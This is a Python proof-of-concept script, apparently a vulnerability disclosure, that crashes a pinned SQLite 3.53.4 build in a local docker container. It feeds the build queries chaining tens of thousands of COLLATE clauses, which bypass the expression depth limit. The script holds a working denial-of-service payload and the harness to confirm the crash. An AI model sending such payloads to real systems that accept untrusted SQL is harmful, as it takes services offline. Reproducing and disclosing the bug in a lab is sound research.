#!/usr/bin/env python3
######################################################################################
#
#        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.
#       d88888 888  "88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b
#      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.
#     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  "Y888b.
#    d88P  888 888  "Y88b 8888888P"     d88P  888    d888b       d88P  888     "Y88b.
#   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       "888
#  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P
# d88P     888 8888888P"  888   T88b d88P     888 d88P   Y88b d88P     888  "Y8888P"
#
#                     888             d8888 888888b.    .d8888b.
#                     888            d88888 888  "88b  d88P  Y88b
#                     888           d88P888 888  .88P  Y88b.
#                     888          d88P 888 8888888K.   "Y888b.
#                     888         d88P  888 888  "Y88b     "Y88b.
#                     888        d88P   888 888    888       "888
#                     888       d8888888888 888   d88P Y88b  d88P
#                     88888888 d88P     888 8888888P"   "Y8888P"
#
#  Website : https://abraxaslabs.tech
#  GitHub  : https://github.com/abraxas
#  Twitter : @abraxas_null
#  Mail    : abraxas.null@proton.me
#
#  CVE: sqlite-collate-depth (High: 7.5)
#  Vendor: SQLite (Hwaci)
#  Versions: SQLite 3.53.4 (leftover of later trunk COLLATE height check)
#  Impact: Long COLLATE chain crashes the host; SQLITE_LIMIT_EXPR_DEPTH never runs
#  Requires: untrusted SQL or VIEW; ASan amalgamation; loopback 127.0.0.1:18800
#
######################################################################################
#
#  RESEARCH / EDUCATIONAL USE ONLY.
#  Do not run, deploy, or use this material against any host unless you have
#  explicit written permission from both the party hosting this repository
#  and the owner of the target systems.
#
######################################################################################

import os as _os
import shutil as _shutil
import sys as _sys
import builtins as _builtins

_ART = {"abraxas": ["        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.", "       d88888 888  \"88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b", "      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.", "     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  \"Y888b.", "    d88P  888 888  \"Y88b 8888888P\"     d88P  888    d888b       d88P  888     \"Y88b.", "   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       \"888", "  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P", " d88P     888 8888888P\"  888   T88b d88P     888 d88P   Y88b d88P     888  \"Y8888P\""], "labs": ["                     888             d8888 888888b.    .d8888b.", "                     888            d88888 888  \"88b  d88P  Y88b", "                     888           d88P888 888  .88P  Y88b.", "                     888          d88P 888 8888888K.   \"Y888b.", "                     888         d88P  888 888  \"Y88b     \"Y88b.", "                     888        d88P   888 888    888       \"888", "                     888       d8888888888 888   d88P Y88b  d88P", "                     88888888 d88P     888 8888888P\"   \"Y8888P\""]}
_CVE = "sqlite-collate-depth"
_SITE = "https://abraxaslabs.tech"
_GH = "https://github.com/abraxas"
_XURL = "https://x.com/abraxas_null"
_XH = "@abraxas_null"
_EMAIL = "abraxas.null@proton.me"
_RST = "\033[0m"
_BLD = "\033[1m"


def _on():
    return not _os.environ.get("NO_COLOR")


def _rgb(r, g, b):
    return f"\033[38;2;{r};{g};{b}m" if _on() else ""


_RAIN = [
    (255, 77, 224), (255, 0, 212), (191, 95, 255), (91, 140, 255),
    (0, 210, 255), (0, 255, 249), (57, 255, 20), (180, 255, 70),
    (255, 230, 0), (255, 201, 70), (255, 122, 24), (255, 64, 96),
]


def _lerp(a, b, t):
    return tuple(int(a[i] + (b[i] - a[i]) * t) for i in range(3))


def _rain(x, width):
    if width <= 1:
        return _RAIN[0]
    t = (x / (width - 1)) * (len(_RAIN) - 1)
    i = min(int(t), len(_RAIN) - 2)
    return _lerp(_RAIN[i], _RAIN[i + 1], t - i)


def _logo_line(line, y, n):
    width = max(len(line), 1)
    out = []
    q = False
    for x, ch in enumerate(line):
        if ch == " ":
            out.append(ch)
            continue
        if ch == '"':
            q = not q
            out.append(_rgb(*(255, 201, 70) if q else (255, 230, 0)) + ch)
            continue
        if q:
            out.append(_rgb(255, 230, 0) + ch)
            continue
        r, g, b = _rain(x, width)
        out.append(_rgb(r, g, b) + ch)
    return "".join(out) + _RST


def print_abraxas_banner():
    cols = _shutil.get_terminal_size((120, 30)).columns
    art = _ART["abraxas"] + _ART["labs"]
    art_w = max(len(x) for x in art)
    content_w = min(max(art_w, 88), max(cols - 4, 40))
    box_w = content_w + 4
    if box_w > cols:
        content_w = max(cols - 4, 20)
        box_w = content_w + 4
    cyan, mag = _rgb(0, 255, 249), _rgb(255, 0, 212)
    top = cyan + "╔" + "═" * (box_w - 2) + "╗" + _RST
    mid = mag + "╠" + "═" * (box_w - 2) + "╣" + _RST
    bot = cyan + "╚" + "═" * (box_w - 2) + "╝" + _RST

    def row(vis, rendered, border):
        return _rgb(*border) + "║" + _RST + " " + rendered + _RST + " " + _rgb(*border) + "║" + _RST

    lines = [top]
    title_l, title_r = " ABRAXAS LABS", "analyze · reverse · disclose"
    gap = max(content_w - len(title_l) - len(title_r), 1)
    title = (title_l + " " * gap + title_r)[:content_w].ljust(content_w)
    cells = []
    split, rstart = len(title_l), content_w - len(title_r)
    for i, ch in enumerate(title):
        if ch == " ":
            cells.append(ch)
        elif i < split:
            cells.append(_rgb(0, 255, 249) + _BLD + ch)
        elif i >= rstart:
            cells.append(_rgb(140, 155, 175) + ch)
        else:
            cells.append(ch)
    lines.append(row(title, "".join(cells) + _RST, (0, 255, 249)))
    lines.append(mid)
    cve_l = " " + _CVE
    cve_r = "authorized research only"
    rest = max(content_w - len(cve_l) - len(cve_r), 3)
    midtxt = " local lab ".center(rest)[:rest]
    cve_line = (cve_l + midtxt + cve_r)[:content_w].ljust(content_w)
    cells = []
    le, rs = len(cve_l), content_w - len(cve_r)
    for i, ch in enumerate(cve_line):
        if ch == " ":
            cells.append(ch)
        elif i < le:
            cells.append(_rgb(255, 77, 224) + _BLD + ch)
        elif i >= rs:
            cells.append(_rgb(57, 255, 20) + ch)
        else:
            cells.append(_rgb(255, 0, 212) + ch)
    lines.append(row(cve_line, "".join(cells) + _RST, (255, 0, 212)))
    lines.append(mid)
    n = len(_ART["abraxas"])
    for y, line in enumerate(_ART["abraxas"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    for y, line in enumerate(_ART["labs"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    lines.append(mid)
    for left, right in (("Website", _SITE), ("GitHub", _GH), ("X", _XH + "  " + _XURL), ("Mail", _EMAIL)):
        gap = max(content_w - 1 - len(left) - len(right), 1)
        vis = (" " + left + " " * gap + right)[:content_w].ljust(content_w)
        out = []
        left_end = 1 + len(left)
        right_start = content_w - len(right)
        for i, ch in enumerate(vis):
            if ch == " ":
                out.append(ch)
            elif i < left_end:
                out.append(_rgb(255, 230, 0) + ch)
            elif i >= right_start:
                out.append(_rgb(0, 255, 249) + ch)
            else:
                out.append(ch)
        lines.append(row(vis, "".join(out) + _RST, (255, 0, 212)))
    lines.append(bot)
    status = "[*]  abraxas!null ready on #labs   ·   " + _SITE
    scol = []
    for ch in status:
        if ch == " ":
            scol.append(ch)
        elif ch in "[]*":
            scol.append(_rgb(57, 255, 20) + ch)
        elif ch in "·#":
            scol.append(_rgb(255, 77, 224) + ch)
        else:
            scol.append(_rgb(232, 255, 248) + ch)
    lines.append(" " + "".join(scol) + _RST)
    _sys.stdout.write("\n".join(lines) + "\n\n")
    _sys.stdout.flush()


def _cprint(*args, **kwargs):
    sep = kwargs.get("sep", " ")
    s = sep.join(str(a) for a in args)
    low = s.lower()
    if s.startswith("SUCCESS") or "success" == low[:7]:
        col = _rgb(57, 255, 20) + _BLD
    elif s.startswith("FAIL") or low.startswith("fail"):
        col = _rgb(255, 64, 96) + _BLD
    elif "user_id" in low:
        col = _rgb(255, 201, 70) + _BLD
    elif low.startswith("status=") or "status=" in low[:20]:
        col = _rgb(0, 255, 249)
    elif low.startswith("carrier"):
        col = _rgb(255, 0, 212)
    elif s.lstrip().startswith("{") or s.lstrip().startswith("["):
        col = _rgb(255, 230, 0)
    else:
        col = _rgb(232, 255, 248)
    kwargs = dict(kwargs)
    file = kwargs.get("file", _sys.stdout)
    if file is _sys.stdout or file is _sys.stderr:
        _builtins.print(col + s + _RST, **{k: v for k, v in kwargs.items() if k != "sep"})
    else:
        _builtins.print(*args, **kwargs)


print_abraxas_banner()
_builtins.print = _cprint

"""Prove SQLite 3.53.4 COLLATE chains skip SQLITE_LIMIT_EXPR_DEPTH (local crash)."""

import os
import re
import subprocess
from dataclasses import dataclass
from pathlib import Path

LABEL = "sqlite-collate-depth"
WITNESS = "SQLITE-COLLATE-DEPTH-WITNESS"
COMPOSE_PROJECT = os.environ.get("COMPOSE_PROJECT_NAME", LABEL)
HERE = Path(__file__).resolve().parent
WORK = HERE / "work"
SERVICE = "sqlite"
SQLITE3 = "/usr/local/bin/sqlite3"
PIN_VERSION = "3.53.4"
PIN_SOURCE_ID = (
    "2026-07-24 19:02:57 bf7c7f30031888f4e796e429ab3978879485813aaca6f641c7b33e4e09459bcc"
)
CONTROL_COLLATES = 50
CRASH_COLLATES = (8_000, 40_000, 120_000, 200_000)
ASAN_OPTIONS = "detect_leaks=0:abort_on_error=1:halt_on_error=1"
COLLATE_TOKEN = " COLLATE BINARY"


@dataclass(frozen=True)
class ShellResult:
    returncode: int
    stdout: str
    stderr: str

    @property
    def blob(self) -> str:
        return f"{self.stdout}\n{self.stderr}"


def log(msg: str) -> None:
    print(msg, flush=True)


def fail(reason: str) -> int:
    log(f"FAIL {LABEL} {reason} {WITNESS}")
    return 1


def compose(*args: str, timeout: int = 60) -> subprocess.CompletedProcess[str]:
    return subprocess.run(
        ["docker", "compose", "-p", COMPOSE_PROJECT, *args],
        cwd=HERE,
        text=True,
        capture_output=True,
        timeout=timeout,
    )


def write_collate_select(path: Path, n: int) -> int:
    chunk = COLLATE_TOKEN * 1000
    full, rem = divmod(n, 1000)
    with path.open("w", encoding="utf-8", newline="\n") as handle:
        handle.write("SELECT 1")
        for _ in range(full):
            handle.write(chunk)
        if rem:
            handle.write(COLLATE_TOKEN * rem)
        handle.write(";\n")
    return path.stat().st_size


def sqlite3_read(sql_path: Path, timeout: int) -> ShellResult:
    proc = compose(
        "exec",
        "-T",
        "-e",
        f"ASAN_OPTIONS={ASAN_OPTIONS}",
        SERVICE,
        SQLITE3,
        "-batch",
        "-noheader",
        ":memory:",
        f".read {sql_path.as_posix()}",
        timeout=timeout,
    )
    return ShellResult(proc.returncode, proc.stdout or "", proc.stderr or "")


def sqlite3_sql(sql: str, timeout: int = 30) -> ShellResult:
    proc = compose(
        "exec",
        "-T",
        "-e",
        f"ASAN_OPTIONS={ASAN_OPTIONS}",
        SERVICE,
        SQLITE3,
        "-batch",
        "-noheader",
        ":memory:",
        sql,
        timeout=timeout,
    )
    return ShellResult(proc.returncode, proc.stdout or "", proc.stderr or "")


def first_line(text: str) -> str:
    for line in text.splitlines():
        stripped = line.strip()
        if stripped:
            return stripped
    return ""


def returned_row(result: ShellResult) -> bool:
    if result.returncode != 0:
        return False
    return first_line(result.stdout) == "1"


def crash_how(result: ShellResult) -> str | None:
    if result.returncode == 0:
        return None
    low = result.blob.lower()
    rc = result.returncode
    if "stack-overflow" in low:
        return "asan-stack-overflow"
    if "addresssanitizer" in low:
        return "asan"
    if rc in (139, -11):
        return "sigsegv"
    if rc in (134, -6):
        return "abort"
    if rc == 137 or rc == -9:
        return None
    if rc is not None and rc > 128:
        return f"signal-{rc - 128}"
    if "deadlysignal" in low or "segmentation" in low:
        return "segv"
    return None


def summarize(name: str, result: ShellResult, nbytes: int = 0) -> None:
    out = result.stdout.replace("\n", "\\n")
    err = result.stderr.replace("\n", "\\n")
    if len(out) > 240:
        out = out[:240] + "..."
    if len(err) > 360:
        err = err[:360] + "..."
    extra = f" bytes={nbytes}" if nbytes else ""
    log(f"{name} rc={result.returncode}{extra} stdout={out!r} stderr={err!r}")


def ioc_lines(result: ShellResult) -> None:
    for line in result.blob.splitlines():
        low = line.lower()
        if any(
            tok in low
            for tok in (
                "addresssanitizer",
                "stack-overflow",
                "deadlysignal",
                "segv",
                "abort",
                "error:",
                "summary:",
            )
        ):
            log(f"IOC {line.strip()[:300]}")


def main() -> int:
    WORK.mkdir(parents=True, exist_ok=True)
    log(f"label={LABEL} compose={COMPOSE_PROJECT} loopback=127.0.0.1:18800")
    log(f"pin-version={PIN_VERSION} pin-source-id={PIN_SOURCE_ID}")

    version = sqlite3_sql("SELECT sqlite_version();")
    source = sqlite3_sql("SELECT sqlite_source_id();")
    log(f"sqlite-version {first_line(version.stdout)!r} rc={version.returncode}")
    log(f"sqlite-source-id {first_line(source.stdout)!r} rc={source.returncode}")
    if version.returncode != 0 or first_line(version.stdout) != PIN_VERSION:
        return fail("pin-version-mismatch")
    if source.returncode != 0 or first_line(source.stdout) != PIN_SOURCE_ID:
        return fail("pin-source-id-mismatch")

    control_path = WORK / "control.sql"
    control_bytes = write_collate_select(control_path, CONTROL_COLLATES)
    log(f"== control n={CONTROL_COLLATES} bytes={control_bytes} ==")
    control = sqlite3_read(Path("/work") / control_path.name, timeout=30)
    summarize("control", control, control_bytes)
    if not returned_row(control):
        ioc_lines(control)
        return fail("control-not-1")

    how: str | None = None
    crash_n = 0
    for n in CRASH_COLLATES:
        sql_path = WORK / f"crash-{n}.sql"
        nbytes = write_collate_select(sql_path, n)
        log(f"== crash-attempt n={n} bytes={nbytes} ==")
        timeout = 90 if n < 80_000 else 180
        try:
            result = sqlite3_read(Path("/work") / sql_path.name, timeout=timeout)
        except subprocess.TimeoutExpired:
            log(f"crash-attempt n={n} timeout={timeout}")
            continue
        summarize(f"crash-n{n}", result, nbytes)
        ioc_lines(result)
        if returned_row(result):
            log(f"crash-n{n} returned-row=1 (depth limit skipped, stack survived)")
            continue
        how = crash_how(result)
        if how is None:
            err = first_line(result.stderr) or first_line(result.stdout) or f"rc={result.returncode}"
            err = re.sub(r"\s+", " ", err)[:160]
            log(f"crash-n{n} no-crash ({err})")
            continue
        crash_n = n
        break

    if how is None:
        last = WORK / f"crash-{CRASH_COLLATES[-1]}.sql"
        if last.is_file():
            result = sqlite3_read(Path("/work") / last.name, timeout=180)
            if returned_row(result):
                return fail("long-chain-returned-row")
        return fail("long-chain-did-not-crash")

    log(
        f"SUCCESS {LABEL} how={how} control={CONTROL_COLLATES} "
        f"crash-n={crash_n} {WITNESS}"
    )
    return 0


if __name__ == "__main__":
    raise SystemExit(main())

